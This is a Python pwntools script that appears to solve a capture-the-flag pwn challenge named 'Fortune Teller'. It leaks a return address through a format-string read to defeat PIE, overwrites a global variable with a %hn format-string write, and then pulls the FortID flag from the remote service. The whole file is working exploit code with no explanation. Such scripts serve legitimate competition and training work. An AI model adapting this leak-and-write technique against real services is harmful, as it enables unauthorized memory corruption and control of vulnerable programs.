#!/usr/bin/env python3
import argparse
import re

from pwn import context, p64, remote

PIE_RETURN_OFFSET = 0x1441
BLESSING_OFFSET = 0x404C
LEAK_ARGUMENT = 37
WRITE_ARGUMENT = 10
WRITE_COUNT = 0x1337


def main():
    parser = argparse.ArgumentParser(description="Solve Fortune Teller")
    parser.add_argument("host", help="organizer instance hostname")
    parser.add_argument("port", type=int, help="organizer instance port")
    args = parser.parse_args()

    context.log_level = "error"
    io = remote(args.host, args.port, ssl=True, sni=args.host, timeout=10)
    try:
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"> ", f"%{LEAK_ARGUMENT}$p".encode())
        io.recvuntil(b"The oracle speaks:\n")
        leak = int(io.recvline().strip(), 16)
        pie_base = leak - PIE_RETURN_OFFSET
        blessing = pie_base + BLESSING_OFFSET

        io.sendlineafter(b"> ", b"1")
        fmt = f"%{WRITE_COUNT}c%{WRITE_ARGUMENT}$hn".encode()
        payload = fmt.ljust(WRITE_ARGUMENT * 8 - 6 * 8, b"A") + p64(blessing)
        io.sendlineafter(b"> ", payload)
        io.recvuntil(b"The oracle speaks:\n")
        io.recvline()

        io.sendlineafter(b"> ", b"2")
        output = io.recvall(timeout=3)
        match = re.search(rb"FortID\{[^}\r\n]+\}", output)
        if not match:
            raise RuntimeError(f"flag not found in service response: {output!r}")
        print(match.group().decode())
    finally:
        io.close()


if __name__ == "__main__":
    main()
